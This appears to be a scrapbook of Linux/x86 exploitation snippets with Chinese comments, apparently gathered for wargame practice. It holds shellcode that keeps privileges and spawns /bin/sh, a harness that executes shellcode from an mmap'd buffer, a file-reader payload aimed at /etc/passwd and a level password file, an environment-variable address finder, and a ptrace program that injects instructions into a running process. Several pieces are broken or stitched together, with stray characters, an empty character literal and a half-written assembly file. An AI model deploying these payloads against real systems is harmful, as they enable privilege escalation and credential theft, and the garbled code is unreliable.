/*
 *
 * linux/x86 setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode
 *
 * blue9057 root@blue9057.com
 *
 */
int main()
{
    char shellcode[]="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
                              "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
                              "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80";
    //setreuid(geteuid(),geteuid());
    //execve("/bin/sh",0,0);
    __asm__(""
            "push $0x31;"
            "pop %eax;"
            "cltd;"
            "int $0x80;"        // geteuid();
            "mov %eax, %ebx;"
            "mov %eax, %ecx;"
            "push $0x46;"    // setreuid(geteuid(),geteuid());
            "pop %eax;"
            "int $0x80;"
            "mov $0xb, %al;"
            "push %edx;"
            "push $0x68732f6e;"
            "push $0x69622f2f;"
            "mov %esp, %ebx;"
            "mov %edx, %ecx;"
            "int $0x80;"        // execve("/bin/sh",0,0);
            "");
}


/*测试shellcode的程序，没有提权*/
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
int (*sc)();
unsigned char shellcode[] = \
"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

main()
{
    printf("Shellcode Length: %d\n", sizeof(shellcode)-1);
    void *ptr = mmap(0, 30,
            PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();
}

/*获取环境变量地址*/
#include <stdlib.h>
int main(int argc, char *argv[])
{
    char *addr;
    addr = getenv(argv[1]);
    printf("%s is at %p\n",argv[1],addr);
}

// 输出hello world的shellcode
char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04"\
                   "\xb2\x0e\x59\xb3\x01\xcd\x80\x31\xc0\xb0\x01\x31"\
                   "\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c"\
                   "\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a";

/*
Linux/x86 file reader.

65 bytes + pathname
Author: certaindeath

Source code:
_start:
  xor  %eax, %eax
  xor  %ebx, %ebx
  xor  %ecx, %ecx
  xor  %edx, %edx
  jmp  two

one:     打开文件
  pop  %ebx
  
  movb  $5, %al
  xor  %ecx, %ecx
  int  $0x80
  
  mov  %eax, %esi
  jmp  read

exit:
  movb  $1, %al
  xor  %ebx, %ebx
  int  $0x80

read:  ssize_t read(int fd, void *buf, size_t count);
  mov  %esi, %ebx   # fd
  movb  $3, %al     # 系统调用编号
  sub  $1, %esp  
  lea  (%esp), %ecx # buf
  movb  $1, %dl     #count
  int  $0x80

  xor  %ebx, %ebx
  cmp  %eax, %ebx
  je  exit

  movb  $4, %al  # write
  movb  $1, %bl 
  movb  $1, %dl
  int  $0x80
  
  add  $1, %esp
  jmp  read

two:
  call  one
  .string  "file_name"
*/
char main[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/etc/passwd"; //Put here the file path, default is /etc/passwd
;readfile.asm
[SECTION .text]

global _start
_start:
    xor %eax,%eax
    xor %ebx,%ebx
    xor %ecx,%ecx
    xor %edx,%edx
    jmp two

two:
    call open
    .string "/home/level9/.pass"




#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/user.h>

const int long_size = sizeof(long);

void getdata(pid_t child, long addr, 
             char *str, int len)
{ 
    char *laddr;
    int i, j;
    union u 
    {
        long val;
        char chars[long_size];
    }data;

    i = 0;
    j = len / long_size;
    laddr = str;

    while(i < j) 
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
        memcpy(laddr, data.chars, long_size);
        ++i;
        laddr += long_size;
    }n
    j = len % long_size;
    if(j != 0) 
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '';
}

void putdata(pid_t child, long addr, char *str, int len)
{ 
    char *laddr;
    int i, j;
    union u 
    {
        long val;
        char chars[long_size];
    }data;

    i = 0;
    j = len / long_size;
    laddr = str;
    while(i < j) 
    {
        memcpy(data.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if(j != 0) 
    {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
    }
}

int main(int argc, char *argv[])
{ 
    pid_t traced_process;
    struct user_regs_struct regs, newregs;
    long ins;
    /**//* int 0x80, int3 */
    char code[] = {0xcd,0x80,0xcc,0};
    char backup[4];
    if(argc != 2) 
    {
        printf("Usage: %s <pid to be traced> ", argv[0], argv[1]);
        exit(1);
    }
    traced_process = atoi(argv[1]);
    ptrace(PTRACE_ATTACH, traced_process, NULL, NULL);
    wait(NULL);
    ptrace(PTRACE_GETREGS, traced_process, NULL, &regs);
    /**//* Copy instructions into a backup variable */
    getdata(traced_process, regs.eip, backup, 3);
    /**//* Put the breakpoint */
    putdata(traced_process, regs.eip, code, 3);
    /**//* Let the process continue and execute 
       the int 3 instruction */
    ptrace(PTRACE_CONT, traced_process, NULL, NULL);
    wait(NULL);
    printf("The process stopped, putting back "
           "the original instructions ");
    printf("Press <enter> to continue ");
    getchar();
    putdata(traced_process, regs.eip, backup, 3);
    /**//* Setting the eip back to the original 
       instruction to let the process continue */
    ptrace(PTRACE_SETREGS, traced_process, NULL, &regs);
    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
    return 0;
}





Linux/x86 file reader.

65 bytes + pathname
Author: certaindeath

Source code:
_start:
  xor  %eax, %eax
  xor  %ebx, %ebx
  xor  %ecx, %ecx
  xor  %edx, %edx
  push $0x31
  pop %eax
  cltd
  int $0x80
  mov %eax, %ebx
  mov %eax, %ecx
  push $0x46
  pop %eax
  int $0x80
  xor  %eax, %eax
  xor  %ebx, %ebx
  xor  %ecx, %ecx
  xor  %edx, %edx

one:     打开文件
  pop  %ebx
  
  movb  $5, %al
  xor  %ecx, %ecx
  int  $0x80
  
  mov  %eax, %esi
  jmp  read

exit:
  movb  $1, %al
  xor  %ebx, %ebx
  int  $0x80

read:  ssize_t read(int fd, void *buf, size_t count);
  mov  %esi, %ebx   # fd
  movb  $3, %al     # 系统调用编号
  sub  $1, %esp  
  lea  (%esp), %ecx # buf
  movb  $1, %dl     #count
  int  $0x80

  xor  %ebx, %ebx
  cmp  %eax, %ebx
  je  exit

  movb  $4, %al  # write
  movb  $1, %bl 
  movb  $1, %dl
  int  $0x80
  
  add  $1, %esp
  jmp  read

two:
  call  one
  .string  "file_name"


